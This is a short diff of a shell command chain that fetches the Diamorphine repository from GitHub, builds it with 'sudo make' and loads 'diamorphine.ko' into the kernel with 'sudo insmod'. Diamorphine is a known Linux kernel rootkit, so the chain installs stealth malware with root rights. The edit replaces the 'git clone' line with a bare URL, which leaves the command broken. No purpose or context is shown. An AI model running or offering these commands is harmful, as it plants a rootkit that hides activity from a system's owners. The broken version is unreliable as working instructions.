@@ -1,4 +1,4 @@
-git clone https://github.com/OverloadedOpRK/Diamorphine && 
+https://github.com/OverloadedOpRK/Diamorphine && 
 cd Diamorphine && 
 sudo make && 
 sudo insmod diamorphine.ko && 
